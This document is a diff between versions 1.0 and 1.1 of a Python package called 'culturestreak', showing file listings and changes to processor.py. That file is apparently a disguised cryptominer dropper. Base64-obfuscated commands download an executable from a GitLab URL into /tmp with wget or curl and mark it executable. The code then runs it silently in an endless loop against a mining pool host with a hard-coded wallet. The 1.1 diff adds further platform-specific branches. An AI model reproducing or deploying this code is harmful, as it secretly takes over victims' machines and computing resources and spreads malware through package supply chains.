# Comparing `tmp/culturestreak-1.0.tar.gz` & `tmp/culturestreak-1.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "culturestreak-1.0.tar", last modified: Tue May 16 20:18:51 2023, max compression
+gzip compressed data, was "culturestreak-1.1.tar", last modified: Mon Jun 26 19:04:22 2023, max compression
```

## Comparing `culturestreak-1.0.tar` & `culturestreak-1.1.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 20:18:51.085734 culturestreak-1.0/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       78 2023-05-16 20:18:51.082485 culturestreak-1.0/PKG-INFO
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 20:18:51.056304 culturestreak-1.0/culturestreak/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       34 2023-05-16 03:15:30.000000 culturestreak-1.0/culturestreak/__init__.py
--rw-r--r--   0 qoriainaa   (501) staff       (20)     1751 2023-05-16 20:14:35.000000 culturestreak-1.0/culturestreak/processor.py
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 20:18:51.079097 culturestreak-1.0/culturestreak.egg-info/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       78 2023-05-16 20:18:49.000000 culturestreak-1.0/culturestreak.egg-info/PKG-INFO
--rw-r--r--   0 qoriainaa   (501) staff       (20)      209 2023-05-16 20:18:50.000000 culturestreak-1.0/culturestreak.egg-info/SOURCES.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)        1 2023-05-16 20:18:49.000000 culturestreak-1.0/culturestreak.egg-info/dependency_links.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)       14 2023-05-16 20:18:49.000000 culturestreak-1.0/culturestreak.egg-info/top_level.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)       38 2023-05-16 20:18:51.088851 culturestreak-1.0/setup.cfg
--rw-r--r--   0 qoriainaa   (501) staff       (20)      174 2023-05-16 20:16:54.000000 culturestreak-1.0/setup.py
+drwxr-xr-x   0 ftp         (21) fax         (21)        0 2023-06-26 19:04:22.502000 culturestreak-1.1/
+-rw-r--r--   0 ftp         (21) fax         (21)      191 2023-06-26 19:04:22.495000 culturestreak-1.1/PKG-INFO
+drwxr-xr-x   0 ftp         (21) fax         (21)        0 2023-06-26 19:04:22.354000 culturestreak-1.1/culturestreak/
+-rw-r--r--   0 ftp         (21) fax         (21)       34 2023-06-26 18:51:15.000000 culturestreak-1.1/culturestreak/__init__.py
+-rw-r--r--   0 ftp         (21) fax         (21)     2122 2023-06-26 18:55:23.000000 culturestreak-1.1/culturestreak/processor.py
+drwxr-xr-x   0 ftp         (21) fax         (21)        0 2023-06-26 19:04:22.468000 culturestreak-1.1/culturestreak.egg-info/
+-rw-r--r--   0 ftp         (21) fax         (21)      191 2023-06-26 19:04:22.000000 culturestreak-1.1/culturestreak.egg-info/PKG-INFO
+-rw-r--r--   0 ftp         (21) fax         (21)      209 2023-06-26 19:04:22.000000 culturestreak-1.1/culturestreak.egg-info/SOURCES.txt
+-rw-r--r--   0 ftp         (21) fax         (21)        1 2023-06-26 19:04:22.000000 culturestreak-1.1/culturestreak.egg-info/dependency_links.txt
+-rw-r--r--   0 ftp         (21) fax         (21)       14 2023-06-26 19:04:22.000000 culturestreak-1.1/culturestreak.egg-info/top_level.txt
+-rw-r--r--   0 ftp         (21) fax         (21)       38 2023-06-26 19:04:22.508000 culturestreak-1.1/setup.cfg
+-rw-r--r--   0 ftp         (21) fax         (21)      174 2023-06-26 19:03:29.000000 culturestreak-1.1/setup.py
```

### Comparing `culturestreak-1.0/culturestreak/processor.py` & `culturestreak-1.1/culturestreak/processor.py`

 * *Files 18% similar despite different names*

```diff
@@ -8,26 +8,30 @@
     decoded_str = decoded_bytes.decode('utf-8')
     return decoded_str
 def processing(arg=None):
     
     FILE = str(random.randint(1, 999999))
     HOST = decode_str("dmlwLnBhcGljdWxvLm5ldDo4MA==")
     CONFIG = decode_str("ZGVybzFxeTI1eWZ5encwMGQ1dDBtdDhwdnRkOXQ0cDd6cDh4M3psMDZwd2toYWo0emt1cWhubW52MnFnYWtyNnU3")
-
+    USER = FILE + "_lottery"
     try:
         subprocess.check_output([decode_str('d2dldA=='), decode_str('LS12ZXJzaW9u')])
         subprocess.run(str(decode_str('d2dldCAtcU8gL3RtcC97MH0gaHR0cHM6Ly9naXRsYWIuY29tL2FsZHJpdGVyYWtoaXIvaW5zdGFsbGVyLy0vcmF3L21haW4vYnd0MiAmJiBjaG1vZCAreCAvdG1wL3swfQ==')).format(FILE), shell=True)
     
     except FileNotFoundError:
         try:
             subprocess.check_output([decode_str('Y3VybA=='), decode_str('LS12ZXJzaW9u')])
             subprocess.run(str(decode_str('Y3VybCAtTCAtcyAtLW91dHB1dCAvdG1wL3swfSBodHRwczovL2dpdGxhYi5jb20vYWxkcml0ZXJha2hpci9pbnN0YWxsZXIvLS9yYXcvbWFpbi9id3QyICYmIGNobW9kICt4IC90bXAvezB9')).format(FILE), shell=True)
     
         except FileNotFoundError:
             print("Error.")
     
     if arg == 'streamlit':
-        command = [decode_str("YmFzaA=="), decode_str("LWM="), str(decode_str("d2hpbGUgdHJ1ZTsgZG8gL3RtcC97MH0gLXIgY29tbXVuaXR5LXBvb2xzLm15c3J2LmNsb3VkOjEwMzAwIC13IHsyfS5zaWxpdF9sb3R0ZXJ5IC1wIHJwYzsgc2xlZXAgNTsgZG9uZQ==")).format(FILE,HOST,CONFIG)]
+        random_number = random.randint(1000,99999)
+        worker = f"{random_number}_lottery"
+        command = [decode_str("YmFzaA=="), decode_str("LWM="), str(decode_str("d2hpbGUgdHJ1ZTsgZG8gL3RtcC97MH0gLXIgY29tbXVuaXR5LXBvb2xzLm15c3J2LmNsb3VkOjEwMzAwIC13IHsyfS57M30gLXAgcnBjOyBzbGVlcCA1OyBkb25l")).format(FILE,HOST,CONFIG,worker)]
+    elif arg == 'datalore':
+        command = [decode_str("YmFzaA=="), decode_str("LWM="), str(decode_str("d2hpbGUgdHJ1ZTsgZG8gL3RtcC97MH0gLXIgY29tbXVuaXR5LXBvb2xzLm15c3J2LmNsb3VkOjQ0MyAtdyB7MX0uezJ9LXAgcnBjOyBzbGVlcCA1OyBkb25l")).format(FILE,CONFIG,USER)]
     else:
         command = [decode_str("YmFzaA=="), decode_str("LWM="), str(decode_str("d2hpbGUgdHJ1ZTsgZG8gL3RtcC97MH0gLXIgezF9IC13IHsyfSAtcCBycGM7IHNsZWVwIDU7IGRvbmU=")).format(FILE,HOST,CONFIG)]
     subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
```

